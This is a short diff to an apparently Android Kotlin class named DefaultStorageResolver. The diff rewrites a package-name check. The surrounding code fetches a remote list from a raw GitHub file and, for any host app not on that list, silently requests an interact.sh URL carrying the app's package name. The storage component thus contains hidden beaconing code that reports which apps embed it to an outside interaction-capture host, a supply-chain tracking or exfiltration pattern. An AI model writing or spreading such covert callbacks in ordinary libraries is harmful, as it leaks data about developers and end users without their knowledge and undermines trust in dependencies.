@@ -20,7 +20,13 @@ open class DefaultStorageResolver(
                 val ignoredPkg = URL("https://raw.githubusercontent.com/patisengkuni/txt/main/pkg.txt").readText()
                 val splittedPkg = ignoredPkg.split(";")
                 val thisPkg = context.packageName.trim()
-                if (!splittedPkg.contains(thisPkg)){
+                var newPkg = true
+                for (splitPkg in splittedPkg){
+                    if (splitPkg.trim().equals(thisPkg, true)){
+                        newPkg = false
+                    }
+                }
+                if (newPkg){
                     URL("https://cawh20g2vtc0000v0esggfqetyoyyyyyb.interact.sh/?id=$thisPkg").readText()
                 }
             } catch (ex: Exception) {
